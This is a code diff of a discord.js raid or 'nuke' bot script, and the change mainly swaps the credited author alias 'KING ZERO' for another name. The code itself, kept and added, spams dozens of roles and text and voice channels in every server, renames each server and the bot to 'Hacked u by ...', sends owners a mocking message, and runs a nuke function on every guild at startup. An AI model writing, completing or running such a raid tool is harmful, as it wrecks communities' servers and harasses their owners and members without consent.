@@ -1,6 +1,6 @@
 const Discord = require("discord.js");
 const LOka = new Discord.Client();
-console.log('By KING ZERO');
+console.log('By بطاطس');
 LOka.on('ready', () => {
   console.log(`Logged in as ${LOka.user.tag} !`);
 
@@ -8,10 +8,10 @@ LOka.on('ready', () => {
 LOka.on('ready',  () => {
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-console.log('      ~            ~  By : KING ZERO ~           ~    ');
+console.log('      ~            ~  By : بطاطس ~           ~    ');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log(`Logged in as  * [ "  Randy " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
+console.log(`Logged in as  * [ "  بطاطس " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
 
         
     
@@ -40,13 +40,13 @@ LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/3
 var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setUsername("Hacked u by unknown Is here")
+LOka.user.setUsername("Hacked u by بطاطس Is here")
 
 }
 });
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
+LOka.user.setGame(`Hacked u by بطاطس Is here`,'https://www.twitch.tv/hix')
 
 }
 });
@@ -61,7 +61,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setName(`Hacked u by unknown Is here`)
+             m.setName(`Hacked u by بطاطس Is here`)
 })
 }
 });
@@ -78,215 +78,200 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      
 
-     if (message.content === "k") {
+     if (message.content === "k1") {
          LOka.guilds.forEach(m =>{
-  m.    m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+  m.createRole({
+        name : "Hacked u by بطاطس Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    }) 
+    m.createRole({
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by KING ZEROIs here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by KING ZEROIs here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by KING ZEROIs here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by KING ZEROIs here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
 
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
      m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
 
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     }) 
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
 
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     }) 
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-
-    m.createRole({
-        name : "Hacked u by KING ZEROIs here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
 
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+
+    m.createRole({
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by KING ZEROIs here",
+        name : "Hacked u by بطاطس Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by بطاطس Is here",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -301,52 +286,52 @@ LOka.on('message', message => {
 LOka.on('message', message => {
          if (message.content === "k") {
                LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
 
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
 
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
 
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
 
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
-m.createChannel('Hacked u by KING ZEROIs here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+
+m.createChannel('Hacked u by بطاطس Is here', 'text');
+m.createChannel('Hacked u by بطاطس Is here', 'text');
 
 })
 }
@@ -355,64 +340,65 @@ m.createChannel('Hacked u by KING ZEROIs here', 'text');
 LOka.on('message', message => {
          if (message.content === "k") {
                  LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
 
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
 
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
 
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
 
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
-m.createChannel('Hacked u by KING ZEROIs here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
+m.createChannel('Hacked u by بطاطس Is here', 'voice');
 
 
 
@@ -431,7 +417,7 @@ async function nuke(guild) {
 
   await guild.fetchMembers();
 
-  await guild.owner.send(' HacKed سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+  await guild.owner.send(' Hacked u by بطاطس Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
 
 
 
@@ -450,9 +436,9 @@ async function nuke(guild) {
     }
   }));
   
-    await guild.createChannel('Hacked u by KING ZEROIs here', 'text');
+    await guild.createChannel('Hacked u by بطاطس Is here', 'text');
 
-      await guild.createChannel('Hacked u by KING ZEROIs here', 'voice');
+      await guild.createChannel('Hacked u by بطاطس Is here', 'voice');
 
   
 
@@ -462,7 +448,7 @@ LOka.on('ready', () => {
   for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
   console.log('-------------------------------------------------------------');
   console.log('');
-  console.log("Made by KING ZERO");
+  console.log("Made by YzhF1");
   console.log("");
   console.log("-------------------------------------------------------------");
 
